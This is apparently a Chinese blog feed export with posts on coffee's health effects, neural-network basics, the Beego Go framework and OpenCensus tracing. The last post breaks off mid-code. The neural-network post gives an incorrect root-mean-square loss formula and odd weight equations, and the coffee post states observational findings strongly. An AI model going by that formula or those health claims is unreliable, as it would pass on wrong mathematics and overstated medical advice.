孕妇应该更加慎重，因为过量的咖啡因与流产风险有关。含咖啡因的咖啡会干扰睡眠或使人紧张。咖啡因可以增加心率，但其与慢性高血压（chronic high blood）的联系目前仍存在疑问。 新加坡国立大学的一位荷兰籍营养流行病学家 Rob van Dam 说：“饮用咖啡并不是一定与高血压联系在一起。” 事实上，大多数与咖啡和咖啡因有关的忧虑，包括胃溃疡，胃酸反流和称为 heart flutter 的心脏颤动（atrial fibrillation），在大量的研究中并没有出现。事实上，大多数研究表明咖啡有益或至少无害。 因此，大众对于咖啡饮料的观念正在改变。但是，由于科学家还没有完全确定咖啡是如何工作的，所以接受的速度很慢。在其成分中，咖啡因（caffeine）和多酚（polyphenols）显然是积极的参与者，但除此之外，其它的咖啡成分及作用就非常复杂了。 哈佛大学营养流行病学家 Frank Hu 说，“要研究出咖啡中各种成分的影响是非常困难的，因为它们中有很多难以分离的成分。” “他们总是搅和在一起。” 保护肝脏咖啡最明显的好处是肝脏保健功能，肝是一个庞大大而繁忙的器官。食物中的营养物质通过胃肠道吸收并进入血液。这些营养素在肝脏代谢 - 排毒 - 调节血脂和血糖。 慢性肝病影响美国 15％ 的人口。肝脏最常因饮酒过量，感染丙型肝炎病毒或发生与肥胖有关的脂肪肝疾病而受损。正如皮肤在受损区域会形成坚硬的胶原蛋白斑块一样，肝脏也是如此。随着时间的推移，这一过程会导致纤维化的胶原瘢痕或纤维化（fibrosis），纤维化可能破坏血液流过肝脏。肝纤维化的潜在风险就是肝硬化（cirrhosis），最终导致肝衰竭（liver failure），Jonathan Dranoff 如是说，它是一位胃肠病学家和肝病学家，来自阿肯色大学医学院（University of Arkansas for Medical Sciences ，小石城）。 当肝脏感受到组织损伤时，复方腺苷（compound adenosine）与肝脏星状细胞（stellate cells）上的受体蛋白（receptor proteins）结合 —— 它们使胶原蛋白形成纤维性疤痕。咖啡因与腺苷受体结合并中断信号传导过程（interrupts the signaling process），从而抑制胶原蛋白大量生产。 肝脏一直是神秘生理学的重要标志。它是最大的器官，它含有最多的血液，被认为是人类内脏中最黑暗、最深不可测的器官。因此，它被认为包含了命运的秘密，被用来算命。在柏拉图时代及后来的生理学中，肝脏代表着最黑暗的激情，特别是愤怒、嫉妒和贪婪的血腥烟雾，驱使人们的行为。因此，肝脏意味着感情冲动的生命本身。– 詹姆斯·希尔曼(James Hillman),心理学家，深度心理学最重要的代表人物之一。 咖啡因抑制胶原蛋白过度生产的第二种方式是：它能够影响谷丙转氨酶（即肝功能检查中的 ALT 指标），这种酶与肝纤维化有关。同样是肝脏疾病患者，日常饮用咖啡的人（含咖啡因）比少量饮用者产生的酶更少。 在美国去年的一项大型研究中也显示，每天喝两杯或更多杯咖啡的能抑制这个麻烦的酶。其他研究表明，咖啡中的某些多酚（在咖啡豆或普通咖啡中发现）可以降低 ALT 水平（knock down）。 患有丙型病毒肝炎（可导致肝纤维化和癌症的病毒感染）的咖啡饮者，也显示出类似的益处。根据2010 年《Hepatology》的一项研究，177 名肝病患者中（大多数患有丙型肝炎），每天喝两杯以上咖啡（含咖啡因）的人比很少喝咖啡者的纤维化低。奇怪的是，其他来源的咖啡因，如能量饮料，则没有发现这项益处。 咖啡也可能对脂肪肝有效，该疾病随着肥胖率上升而蔓延。美国科学家挑选了 306 名未被诊断患有肝病的超重人群。超声波图像（Ultrasound images）和肝活检（biopsies）显示 180 人的肝脏有脂肪沉积现象，纤维化的早期迹象。基于这些测试，完全不喝咖啡者比咖啡消费者更快地走向纤维化。 2012 年《Hepatology》的一份报告指出，患有晚期脂肪肝的人平均每日饮用咖啡（含咖啡因）少于一杯，而那些仍处于疾病早期阶段的人每天接近两杯。 在抗肝癌方面，咖啡显示出惊人效果。今年早些时候，一个欧洲团队报告说，每天喝 2.5 杯咖啡以上的女性或 3.5 杯以上的的男性，患肝癌的概率比喝不到三分之一杯的人少72％ 。该研究持续监测 11 年，覆盖大约 50 万名健康人群。在研究期间，一共有 201 人发展成肝癌。科学家将研究成果发表在 4 月 15 日的 《 International Journal of Cancer》（国际癌症杂志），他们表示，即使考虑到肝炎的因素加以调整后，研究结果仍具有鲁棒性（稳健性）。 肝癌监测结果表明 “很可能是咖啡对慢性肝病保护作用的延伸”，Anna Flögel 说。他是该研究的共同作者，来自德国 Potsdam-Rehbrücke 人类营养研究所。 一些医生认可这一结论。 “我要为患者的处方中加上咖啡吗？” Dranoff 问道。 “对于慢性肝病患者，答案是肯定的。” 2014 年 Liver International ，来自加州大学洛杉矶分校的医生 Sammy Saab及其同事表示，应该鼓励肝病患者“每天喝咖啡”。 预防糖尿病2002 年开始，有研究发现咖啡对二型糖尿病的保护作用。在一项针对健康人群的研究中，van Dam 和他的荷兰同事 Edith Feskens 发现，那些平均每天喝七杯咖啡的人比那些每天喝两杯或更少的人患糖尿病的概率要低一半。在这项研究中，年龄在 30 岁到 60 岁之间的人，保护作用开始发生的起点似乎是每天三杯，随着摄入量增加而增强。 该报告发表在《 Lancet 》(柳叶刀) 上，引发了数十项试图复制它的研究。在 2014 的 《 Diabetes Care 》( 糖尿病护理 ) 中发表了 28 项国际研究回顾，包括超过 100 万名健康受试者、监测 10 个月至 20 年。在研究中大约有 45000 例二型糖尿病患者。在一天喝三杯 vs 不足一杯的情况下对比，罹患糖尿病的可能性降低了 21 %。对于每天喝六杯的人来说，风险降低了 33% 。普通咖啡与无因咖啡结果一样。 二型糖尿病的发病之前的现象是能量代谢不良（inefficient energy metabolism）。细胞不能有效地摄取葡萄糖，从而导致高血糖。咖啡因和被称为绿原酸（chlorogenic acids）的多酚提高了代谢效率。当澳大利亚科学家给老鼠喂食高脂肪、高碳水化合物的食物时，动物开始表现出能量代谢不良的现象，其中一些发生了脂肪肝甚至心脏病的早期征兆。咖啡提取物，包括咖啡因、绿原酸和其他成分，提高了动物处理葡萄糖的能力，降低了血压，减缓了对心脏和肝脏的损害。该报告发表在 2012 年的《Journal of Nutrition》（营养杂志）。 当然，加糖会减损咖啡的神奇效果。另外，牛奶富含钙和蛋白质，但会稀释咖啡。因此，不建议刻意喝浓咖啡，普通咖啡即可。对于有非酒精性脂肪肝或者体重较重人群，无糖咖啡更合适。 寻找完美的杯子阿拉伯咖啡（Arabica，小果咖啡）和 罗布斯塔（Robusta，亦称中果咖啡 Coffea canephora，占世界咖啡产量的 20% ）。罗布斯塔的味道更具攻击性，咖啡因和益多酚（绿原酸）的含量更高。阿拉伯咖啡较温和也更受欢迎，但糖和油脂含量更高，邓肯甜甜圈和星巴克都声称只使用阿拉伯咖啡。 冲泡一杯健康的咖啡，制备方法可能与选择咖啡豆种类一样重要。根据 2013 年 《Food Chemistry》的一份报告，焙烤对咖啡豆中的绿原酸有很好的烹饪效果（见图表）。 当今流行的滴滤器用于从咖啡中去除胆固醇油脂。煮咖啡和法式滤压壶（French press）可以过滤油脂；意大利浓咖啡只滤出部分油脂（油花和香气影响风味）。在2012 年发表的一项研究中，意大利浓咖啡饮用者相对于过滤咖啡的饮用者，高密度脂蛋白（High-density lipoprotein，HDL，“好的胆固醇”）水平更低、甘油三酯（TG）水平更高。但是过滤也有其缺点，包括抗癌成分的损失。 随着研究的深入，研究者们试图定义完美的杯子。“我们已经到达了一个有趣的十字路口，”Jonathan Dranoff 说，“在 手艺和健康之间 。” 在显微镜下咖啡的抗癌作用似乎可以延伸到肝脏以外，但程度比较温和。例如，2月份发表的《Cancer Epidemiology, Biomarkers &amp; Prevention》（癌症流行病学、生物标记物与预防）报道，与少量饮用者相比，每天喝三杯咖啡的欧洲女性患子宫癌的风险低 19％。早些时候，日本研究人员发现，日常饮用咖啡的人相对极少饮用的人，稍微不太容易患上口腔和咽喉癌。咖啡也表现出对抗结肠癌，黑色素瘤和乳腺癌的潜力。 如果没有生物学解释，上述流行病学研究将大打折扣。对于癌症，咖啡有几个候选项。咖啡和咖啡因中的多酚促进 DNA 基因修复，这是保持细胞免于癌变的关键步骤。主要的多酚，绿原酸和咖啡酸（与咖啡因无关）是去甲基化剂，这意味着它们可以阻止甲基向 DNA 添加。甲基化（Methylation）可能是癌症的触发因素。 称为二萜（diterpenes）的咖啡成分也可能与癌症发生作用。在细胞培养和动物研究中，称为咖啡醇（cafestol）和咖啡豆醇（kahweol）的两种二萜能抑制某些致癌物质并降低肝 DNA 加合物（与致癌化学物质结合的DNA片段）的浓度。 咖啡豆醇具有抗炎作用并抑制血管生成——肿瘤所需的血管生长紊乱。作为额外的好处，二萜类化合物可以提高谷胱甘肽（glutathione）的水平，谷胱甘肽是一种有效的抗氧化剂，可以预防肝脏损伤。在实验室的人类间皮瘤测试中（通常由石棉暴露引起的肺部癌症），二萜靶向并杀死癌细胞。 同时，巴西研究人员在 5 月份的《 Journal of Agricultural and Food Chemistry 》杂志上报道，绿原酸和咖啡酸也可以作为抗氧化剂，能够清除有害的自由基。在肠损伤的大鼠模型中，绿原酸和咖啡酸减少了自由基的损害。英国团队发现，在肠内，咖啡也可能有助于双歧杆菌的生长。这些天然的肠道居民已被用作益生菌治疗腹泻和溃疡性结肠炎。 葫芦巴碱（Trigonelline）是另外一种咖啡成分，似乎有助于抗糖尿病作用，同时还可作为抗氧化剂并有益于大脑。最近，科学家们开始对称为羟基氢醌（hydroxy­hydroquinone，HHQ）的咖啡化学成分感兴趣，它随着焙烧过程而增加。好消息是HHQ 可能具有抗癌特性。坏消息是它可能会抑制一些绿原酸的作用，特别是它们降低血压的能力。咖啡酸可以增强人体内的一氧化氮，使血管更灵活，利于血管扩张。 放心剂量：一到四杯所有这些生物效应，无论它们如何工作，都可能会阻止收割者。 2012 年《New England Journal of Medicine》的报道了一份死亡率研究，从 1995 年至 2008 年针对包括超过 400,000 名中年和老年人进行观测，研究发现咖啡消费可以降低死亡风险 6％ 至 16％。 在日本，最近一项对超过 9 万人进行的研究显示，每天饮用三到四杯咖啡似乎是最佳选择。研究人员在 5 月份的 《American Journal of Clinical Nutrition》（美国临床营养学杂志）中报道，根据接近 19 年的随访，每天饮用三到四杯咖啡的饮用者比不喝咖啡的人死亡率低 24％ 。 美国国家癌症研究所（ National Cancer Institute）的生物化学家和流行病学家尼尔·弗里德曼（Neal Freedman）说：“这些研究为常规饮用咖啡者提供了参考依据，这似乎是一种相对安全的行为。” 他共同撰写了 2012 年的研究报告。 在早期的工作中，van Dam 试图建立咖啡摄入量的安全上限。他和其他人发现，每天喝六杯的人中没有增加死亡风险。 尽管积极的调查结果大量涌现，但一些研究人员仍然保持谨慎态度。 Klatsky 提供了一个例子，关于研究显示房颤和咖啡、咖啡因之间是否相关。 “出现咖啡因症状的人倾向于停止饮用，” 他说。因此，在一些研究中喝咖啡的人会是那些没有任何不良影响的人，这是一个自我选择的群体。其他研究往往没有注意到人们喝咖啡的种类，烘焙程度或其他可能影响的细节。 尽管如此，咖啡的新地位 —— 作为一种不会带来内疚的快乐，可能正在成为主流。美国专家组会每五年审查一次膳食指南（dietary guidelines）并向联邦政府提出建议。其 2015 年 2 月的报告支出，每天喝三到五杯咖啡不会带来慢性疾病风险。该报告甚至指出了饮用咖啡对糖尿病，心脏病和帕金森症的明显益处。 “这是一种范式转变，” 专家小组成员 Hu 表示，科学家们持谨慎态度，并担心过多的咖啡因可能对孩子不利。但在成年人中，咖啡的图景日渐清晰。 “喝咖啡不是万能的，” “这只是一种可能获得健康益处的饮用习惯。” 总结：咖啡与健康国际癌症研究机构（International Agency for Research on Cancer，简称 IARC）是世界卫生组织下属的一个跨政府机构（办公地点：法国里昂）。该机构的主要任务是进行和促进对癌症病因的研究，也进行世界范围内的癌症的流行病学调查和研究工作。该机构还负责编纂关于各种提高患癌概率因素的论文集，这些因素包括化学品，混合物，辐射，物理和生物制剂和生活状态因素等。各国的卫生部门据此作为控制致癌因素的科学基础。 IARC 将致癌因素分为以下几类： 1 类：对人类有确认的致癌性，包括放射性同位素、苯、石棉、黄曲霉素、酒精、烟草、槟榔、马兜铃酸（关木通、广防己、青木香、天仙藤、马兜铃等中药材）等。 2A 类：对人类很可能有致癌性，包括氯霉素、甲醛、苯乙烯、柴油内燃机废气等。 2B 类：有可能对人类致癌，包括电磁波、汽油引擎废气、黄樟素、乙醛等。 3 类：尚不能确定其是否对人体致癌 4 类：对人体基本无致癌作用 1991 年，IARC 曾将咖啡中的咖啡酸与红肉一并列为 2B 类致癌物（限于膀胱癌），即“有可能对人体致癌”。不过，IARC 在 2016 年 6 月 15 日发表报告说明，经过彻底的审视 1000 份研究报告后，发现没有足够的证据支持“咖啡有可能致癌”的论点。 咖啡因 Caffeine 减少肝纤维化 减缓心脏和肝脏损伤 预防帕金森病，痴呆症和抑郁症 促进多巴胺分泌（使人感觉良好） 多酚 Polyphenols（绿原酸 chlorogenic acids，咖啡酸 caffeic acid） 减少肝纤维化 促进DNA修复 减少血栓 提高代谢率 降低血压（抵消咖啡因引起的短暂血压升高效应） 充当去甲基化剂 减少自由基引起的肠道损伤 二萜类化合物 Diterpenes（咖啡醇 cafestol 和 咖啡豆醇 kahweol） 抗致癌物质 减少肝脏DNA加合物（与致癌物结合的DNA位） 提高谷胱甘肽的水平（一种防止肝损伤的抗氧化剂） 靶向并杀死肺组织中的间皮瘤细胞 咖啡豆醇具有抗炎作用，减少血液流向肿瘤 风险：可能导致更高水平的低密度脂蛋白胆固醇（LDL，“坏胆固醇”） 胡芦巴碱 Trigonelline 抗氧化 降低血糖 可能有益于大脑 好马配好鞍，好咖啡更需要好音乐有人说，音乐、书和咖啡馆是三胞胎、不分彼此。冲上一壶好咖啡，如果再能来上一段乌兰诺娃的《天鹅湖》就更有味道了。黑胶唱片释放出来的美妙旋律，芭蕾舞演员极致轻盈、优雅舒展的舞姿，王子和公主登上金色的帆船，驶向幸福的远方 …… Perfect ！ 扩展阅读：《嗑药简史》嗑药简史（一）：药物成瘾与神经系统 什么是瘾？成瘾分类：物质成瘾、行为成瘾 药物成瘾：管制药品及毒品、宗教致幻剂、酒精和烟草 行为成瘾：饮食、运动、性、暴力和战争 瘾的形成机制：奖赏路径和神经递质（多巴胺、肾上腺素、内啡肽和催产素） 嗑药简史（二）：瘾品跨境流动与外交关系扰动中美大国外交的 China Girl (芬太尼) 什么是芬太尼,Fentanyl 大国外交的头等优先事项 预测：暗黑幽灵无国界 嗑药简史（三）：瘾品管制背后的情与法 严刑峻法：瘾品管制与定罪量刑 戈尔巴乔夫的禁酒运动 嗑药简史（四）：咖啡上瘾，喝还是不喝？ 咖啡的保健作用及临床实证研究案例 咖啡种类、制作工艺对健康效益的影响 嗑药简史（附录）：NIDA | 美国青年人群药物滥用情况(2016~2017)医学常识| NIH 情绪健康检查单医学常识| 肝系统健康状况评价指标体系参考文献 IARC 1991 | Coffee has never been a mere beverage | IARC 2016 | IARC Monographs evaluate drinking coffee, maté, and very hot beverages Coffee reveals itself as an unlikely elixir | From liver disease to diabetes, coffee compounds protect against an array of health conditions|BY NATHAN SEPPA 12:02PM, SEPTEMBER 18, 2015 咖啡，该给你处方了！—咖啡与肝脏疾病 The evolutionary energy in man]]></content>
      <tags>
        <tag>Medical</tag>
        <tag>Science</tag>
        <tag>Economist</tag>
        <tag>Health</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Machine Learning:神经网络基础]]></title>
    <url>%2F2018%2F05%2F07%2FMachine-Learning-Neural-Network%2F</url>
    <content type="text"><![CDATA[摘要 Introduction 工作流程：Forward-Propagation、Backward Propagation、Partial Derivatives、Hyper Parameters 深度网络：A single layer Neural Network、Wide Neural Network vs Deep Neural Network 维度诅咒、权衡 Introduction神经网络试图复制人脑的工作以使事情更加智能化。 神经网络通常是一种有监督的学习方法。这意味着需要有一套训练集。理想情况下，训练集合包含了绝对真值（tags | 标签，classes | 类 ）的例子。例如在文本情感分析的情况下，训练集是句子列表和它们各自对应的情绪。（注意：未标记的数据集也可以用来训练神经网络，但这里仅考虑最基本的情况。） 例如：将文本称为 X ，将它们的标签称为 Y 。 有一些函数可以定义 X 和 Y 之间的关系，比如是什么特征（词/短语/句子结构等）导致一个句子是否定的或肯定的的含义。早期的人们习惯于手动查找这些特征，这被称为特征工程（feature engineering）。神经网络使得这一过程实现自动化处理。 So there are many ways you can understand a concept, choose whichever suits you, being persistent about the learning part. At the end knowing maths is a useful tool when it comes to optimisations or experimentations. 工作流程 人工神经网络由3个组成部分组成： 输入层 Input Layer 隐藏（计算）层 Hidden (computation) Layers 输出层 Output Layer 学习过程分两步进行： 前向传播 Forward-Propagation：猜测答案 反向传播 Back-Propagation：最小化实际答案和猜测答案之间的误差 前向传播 Forward-Propagation 随机初始化权重（Randomly initialize weights） w1 w2 w3输入层的数据乘以权重形成隐藏层 h1 = (x1 * w1) + (x2 * w1) h2 = (x1 * w2) + (x2 * w2) h3 = (x1 * w3) + (x2 * w3)隐藏层的输出通过非线性函数(激活函数)以形成猜测输出(guessed output) y_ = fn( h1 , h2, h3 ) 反向传播 Backward Propagation 总误差 total_error 通过一个代价函数 (cost function) 来计算，参数为计算期望值( expected value ) y（训练集中的值）和观测值(observed value) y_（前向传播值） 按每一个权重计算误差的偏导数（这些偏微分是每一个权重在总误差中的量度） 微分后乘以一个小数 ( η ) ，η 称为学习率（learning rate） 然后从各自的权重中减去结果 反向传播的结果是以下更新的权重： w1 = w1 - (η * ∂(err) / ∂(w1)) w2 = w2 - (η * ∂(err) / ∂(w2)) w3 = w3 - (η * ∂(err) / ∂(w3)) 基本上我们对权重初始化时是随机的，并假设他们会产生准确的答案。 Those familiar with Taylor Series, backpropogation shares the same end result with it. But instead of an indefinite series we try to optimise the first element only. 偏差（Bias）是添加到隐藏层的权重。它们也被随机初始化并以隐藏层相似的方式更新。虽然隐藏层的作用是映射数据中底层函数（underlying function）的模型，但偏差的作用是横向移动学习函数（the learned function），使其与原始函数（the original function）重叠。 偏导数 Partial Derivatives计算偏导数使我们能够知道每个权重对误差的贡献。 导数的需求是显而易见的。例如：假设一个试图找到自动驾驶汽车最佳速度的神经网络。现在，如果汽车发现速度比预期的更快或者更慢，那么神经网络会通过加速或减速来改变速度。什么是加速/减速？速度的导数。 解释偏导数：射飞镖假设有几个孩子被要求向飞镖靶掷飞镖，瞄准中心。最初的结果是： 现在如果我们确认了总误差并简单地从所有权重中减去，那么我们可以概括每个学生的误差。假设一个孩子瞄准的目标太低，但是我们要求所有的孩子都瞄准得更高一些，结果是： 一些学生的错误可能会减少，但总体错误仍然会增加。通过查找偏导数，我们可以找出每个权重单独产生的误差。单独修正每个权重会得到以下结果： 超参数 Hyper Parameters虽然神经网络被用于自动化特征选择，但是仍然有一些参数我们必须手动输入。 学习速率 Learning Rate学习速率是一个非常关键的超参数。如果学习速率太小，那么即使在长时间训练神经网络之后，它仍将远离最优结果。结果看起来像： 相反，如果学习率太高，那么学习者就会过早地得出结论。产生以下结果： 激活函数 Activation Function简单来说，激活函数（激励函数）负责决定哪些神经元将被激活，即什么信息将传递给其他层。没有激活函数，深度神经网络将失去大量的描述学习能力。 这些函数的非线性负责增加学习者的自由度，使他们能够在较低维度上推广高维的问题。下面是一些流行的激活函数的例子： 成本函数 Cost Function成本函数是神经网络的核心。它用于计算真实和观察结果的损失(loss)。我们的目标是尽量减少这种损失。因此，成本函数有效地推动了神经网络对其目标的学习。 成本函数是神经网络做的“有多好”的量度，在给定训练样本和预期输出方面。它也可能取决于变量，如权重(weights)和偏差(biases)。 成本函数是一个单一的值，而不是一个矢量，因为它评价了神经网络作为一个整体的效果。一些最着名的成本函数是： 平方平均数 Quadratic Cost ，简称均方根 Root Mean Square 交叉熵 Cross Entropy 指数 Exponential (AdaBoost) 相对熵 Kullback–Leibler divergence 或者 信息收益 Information Gain 均方根是其中最简单和最常用的。它被简单地定义为： Loss = √(expected_output ** 2) - (real_output ** 2) 神经网络中的成本函数应满足两个条件： 成本函数必须能够写成平均值 成本函数不能取决于除一个神经网络中的输出值以外的的任何激活值 深度网络深度学习是一类机器学习算法，可以从数据中学习更深入（更抽象）的洞察力。 使用级联，类似流水线的依次传递管道，拥有多层处理单元（非线性）进行特征提取和转换。 基于以无监督方式学习数据的特征（表示数据知识）。更高级别的特征（在后面的处理图层中找到）是从更低级别的特征（可在初始处理图层中找到）导出的。 多级表示相对应的不同抽象级别；这些级别构成了概念的层次结构。 单层神经网络 A single layer Neural Network单层神经网络，无论第一层（绿色神经元）如何学习，他们只需将其传递给输出即可。 双层神经网络 Two layer Neural Network对于两层神经网络，无论绿色隐藏层学习什么，都要传递到蓝色隐藏层，进一步学习（关于绿色层学习）。因此，隐藏层的数量越多，对先前已经学习过的概念的学习就越多。 Wide Neural Network vs Deep Neural Network在一层中存在更多神经元的情况下，它不会获得更深层次的洞察力。相反，它的结果是学习到更多的概念。 例：学习英语语法，它需要理解大量的概念。在这种情况下，单层宽神经网络比深度神经网络的效果要好得多，而深度神经网络的宽度要小得多。 但在学习傅立叶变换(Fourier Transform)的情况下，学习者（神经网络）需要深入学习，因为没有太多的概念需要学习，但每个概念都足够复杂，需要深度学习。 Balance is Key 每个任务都使用深度和宽度神经网络是非常诱人的。这可能是一个非常糟糕的主意，因为： 两者都显然需要更多的数据才能达到最低的理想精度（desirable accuracy） 两者都具有成倍增加的时间复杂度（time complexity） 太深的神经网络将尝试更深入地分解一个基本概念，但在这一点上它将对这个概念做出错误的假设，并试图找到不存在的伪模式（pseudo patterns） 太宽的神经网络会试图找到更多数量的特征（可测量特性）。因此，与上面类似，它将开始对数据做出错误的假设。 维度诅咒维度诅咒（The curse of dimensionality）是指在高维空间（通常具有数百或数千维度）中分析和组织数据时出现的各种现象，这些现象在低维设置中不会发生。 像英语语法或股票奖品等有很多影响他们的特征。使用机器学习必须用具有有限和相对小得多的长度（比实际存在的特征的数量）的阵列（array）/ 矩阵（matrix）来表示这些特征。要做到这一点可能产生两个问题： made by a learner：由于学习者的错误假设而出现偏差。高偏差会导致算法错过功能与目标输出之间的相关关系。这种现象被称为欠拟合（underfitting）。 insufficient learning : 由于对特征的了解不全面，训练集中的小波动导致较大偏差。高方差导致过度拟合（overfitting），将错误作为相关信息进行学习。 权衡It is typically impossible to have low bias and low variance. 在训练早期因为网络输出远未达到要求，偏差很大。由于数据影响较小，方差很小。在训练后期因为网络已经学会了潜在的功能，偏差很小。 然而，如果训练太长，网络也将学习该数据集特殊的噪声。这导致在不同数据集上测试的结果表现为高方差，因为不同数据集的噪声存在变化。实际上，具有高偏差的算法通常产生更简单的模型，这些模型不倾向于过度拟合，但可能会削弱其训练数据，而不能捕获重要的模式或特征的属性。具有低偏差和高方差的模型在结构上通常更复杂，使得它们能够更准确地表示训练集。然而，在这一过程中，它们也可能代表训练集中的占比较大的噪声，使得它们的预测尽管复杂性增加，但精度却不太精确。 因此，低偏差和低方差同时存在通常是不可能的。 目前，依靠丰富的数据和工具，我们可以轻松地创建复杂的机器学习模型。如果学习者没有提供足够的信息时，实际上偏差就发生了，处理过度拟合将变成中心工作。如果提供更多的例子，则意味着更多的变化，包括模式的数量都增加了。 扩展阅读:《The Machine Learning Master》 Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别 Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js Machine Learning:机器学习项目 Machine Learning:机器学习算法 Machine Learning:如何选择机器学习算法 Machine Learning:神经网络基础 Machine Learning:机器学习书单 Machine Learning:人工智能媒体报道集 Machine Learning:机器学习技术与知识产权法 Machine Learning:经济学家谈人工智能 数据可视化（三）基于 Graphviz 实现程序化绘图 参考文献 Basics of Neural Network | Mukul Malik 为什么需要激励函数 (Activation Function) Building a neural network from scratch in R]]></content>
      <tags>
        <tag>架构师</tag>
        <tag>Machine-Learning</tag>
        <tag>数学与算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[玩转编程语言:基于Golang开发Web应用]]></title>
    <url>%2F2018%2F04%2F27%2FLanguage-Go-lang-Web%2F</url>
    <content type="text"><![CDATA[摘要 beegoBeego ABC lib 12go get github.com/astaxie/beegogo get github.com/beego/admin/src/lib toolsbee 可执行文件默认路径 $GOPATH/bin 1go get github.com/beego/bee //tools 123456789The commands are: new create an application base on beego framework run run the app which can hot compile pack compress an beego project api create an api application base on beego framework bale packs non-Go files to Go source files version show the bee &amp; beego version generate source code generator migrate run database migrations 1234567bash-3.2$ bee new hello______| ___ \| |_/ / ___ ___| ___ \ / _ \ / _ \| |_/ /| __/| __/\____/ \___| \___| v1.9.1 Beego Resources The architecture of Beego beego入门教程 基于beego的后台管理系统 参考文献 Top 6 web frameworks for Go as of 2017.doc]]></content>
  </entry>
  <entry>
    <title><![CDATA[DevOps 漫谈：开源分布式跟踪系统 OpenCensus]]></title>
    <url>%2F2018%2F04%2F27%2FDevOps-OpenCensus%2F</url>
    <content type="text"><![CDATA[摘要 Distributed Tracing and Monitoring System OpenCensus: A framework for distributed tracing OpenCensus Principle: data structure 、Context This article is part of an Distributed Tracing and Monitoring System tutorial series. Make sure to check out my other articles as well: DevOps 漫谈：开源分布式跟踪系统 OpenCensus DevOps 漫谈：分布式追踪系统标准体系 绪论随着互联网技术的高速发展，以往单应用的服务架构已经很难处理如山洪般增长的信息数据，随着云计算技术的大规模应用，以微服务、RESTful 为代表的各种软件架构广泛应用，跨团队、跨编程语言的大规模分布式系统也越来越多。相对而言，现在要理解系统行为，追踪诊断性能问题会复杂得多。 在单应用环境下，业务都在同一个服务器上，如果出现错误和异常只需要盯住一个点，就可以快速定位和处理问题；但是在微服务的架构下，功能模块天然是分布式部署运行的，前后台的业务流会经过很多个微服务的处理和传递，就连日志监控都会成为一个大问题（日志分散在多个服务器、无状态服务下如何查看业务流的处理顺序等），更不要说服务之间还有复杂的交互关系。 用户的一个请求在系统中会经过多个子系统（或者多个微服务）的处理，而且是发生在不同机器甚至是不同集群，当发生异常时需要快速发现问题，并准确定位到是哪个环节出了问题。对系统行为进行跟踪必须持续进行，因为异常的发生是无法预料的，有些甚至难以重现。跟踪需要无所不在，否则可能会遗漏某些重要的故障点。 为了解决上述问题，分布式跟踪系统 —— 一种帮助理解分布式系统行为、帮助分析性能问题的工具应运而生。 第一部分 Google Dapper : Distributed Tracing and Monitoring System Modern Internet services are often implemented as complex, large-scale distributed systems.These applications are constructed from collections of software modules that may be developed by different teams, perhaps in different programming languages, and could span many thousands of machines across multiple physical facilities. Tools that aid in understanding system behavior and reasoning about performance issues are invaluable in such an environment. 在分布式追踪领域著名的论文《Dapper, a Large-Scale Distributed Systems Tracing Infrastructure|Google Technical Report dapper-2010-1, April 2010》 Google 工程师提出了关于分布式跟踪系统的一些重要概念： Annotation-based，基于标注或植入点(埋点)在应用程序或中间件中明确定义全局标注（Annotation），一个特殊的ID，通过这个 ID 连接每一条请求记录。当然，这需要代码植入，在生产环境中可以通过一个通用组件开放给开发人员。 跟踪树（trace tree）和 span在 Dapper 跟踪树中，基本单元是树节点（分配 spanid）。节点之间通过连线表示父子关系，通过 parentId 和 spanId 把所有的关系串联起来，实现记录业务流的作用。 第二部分 OpenCensus: A framework for distributed tracing OpenCensus is a framework for stats collection and distributed tracing. Google Dapper 的定位更准确的说是分析系统，并不能解决从生产服务中提取数据的难题，OpenCensus 项目为此提供了解决方案。 OpenCensus 项目是 Google 开源的一个用来收集和追踪应用指标的第三方库。OpenCensus 能够提供了一套统一的测量工具：跨服务捕获跟踪跨度（span）、应用级别指标以及来自其他应用的元数据（例如日志）。OpenCensus 有如下一些主要特点： 标准通信协议和一致的 API ：用于处理 metric 和 trace 多语言库，包括Java，C++，Go，.Net，Python，PHP，Node.js，Erlang 和 Ruby 与 RPC 框架的集成，可以提供开箱即用的追踪和指标。 集成的存储和分析工具 完全开源，支持第三方集成和输出的插件化 不需要额外的服务器或守护进程来支持 OpenCensus In process debugging：一个可选的代理程序，用于在目标主机上显示请求和指标数据 OpenCensus ConceptsTags | 标签OpenCensus 允许系统在记录时将度量与维度相关联。记录的数据使我们能够从各种不同的角度分析测量结果，即使在高度互连和复杂的系统中也能够应付。标签以键值对的形式在上下文中传递，并且允许在当前上下文中添加或修改。 1234ctx, err = tag.New(ctx, tag.Insert(osKey, "macOS-10.12.5"), tag.Upsert(userIDKey, "cde36753ed"),) Stats | 统计Stats 收集库和应用程序记录的测量结果，汇总、导出统计数据。为了实现低开销（ a low-overhead framework even if instrumentation is always enabled ），数据点记录和数据聚合是分离的，OpenCensus 统计收集分两个阶段进行： 测量的定义和数据点的记录 | Definition of measures and recording of data points 视图的定义和记录数据的聚合 | Definition of views and aggregation of the recorded data Recording | 记录量度 (Measurements) 是与测量相关联的数据点。(Measurements are data points associated with a measure.)记录 (Recording) 利用上下文中所提供的标签隐式地标记量度集合。(Recording implicitly tags the set of Measurements with the tags from the provided context.) 1stats.Record(ctx, videoSize.M(102478)) Trace | 跟踪Trace 是嵌套 Span (跨度)的集合。Trace 包括单个用户请求的处理进度，直到用户请求得到响应。Trace 通常跨越分布式系统中的多个节点。跟踪由 TraceId 唯一标识， Trace 中的所有 Span 都具有相同的 TraceId 。 一个 Span 代表一个操作或一个工作单位。多个 Span 可以是“Trace”的一部分，它代表跨多个进程/节点的执行路径（通常是分布式的）。同一轨迹内的 Span 具有相同的 TraceId。 12ctx, span := trace.StartSpan(ctx, "your function name")defer span.End() 视图 | Views视图用于聚合测量结果。你可以把它们看作是对记录数据点（量度）集合的查询。视图包括两个部分：分组标签（group by）和聚合类型（aggregation type）。目前 OpenCensus ( Golang API ) 支持三种类型的聚合： CountAggregation 用于记录被抽样的次数； DistributionAggregation 用于提供包含一系列样本值的直方图； SumAggregation 用于汇总所有样本值。 123distAgg := view.Distribution(0, 1&lt;&lt;32, 2&lt;&lt;32, 3&lt;&lt;32)countAgg := view.Count()sumAgg := view.Sum() 示例：创建一个视图（ DistributionAggregation，指标 “videoSize” ）12345678if err := view.Register(&amp;view.View&#123; Name: "my.org/video_size_distribution", Description: "distribution of processed video size over time", Measure: 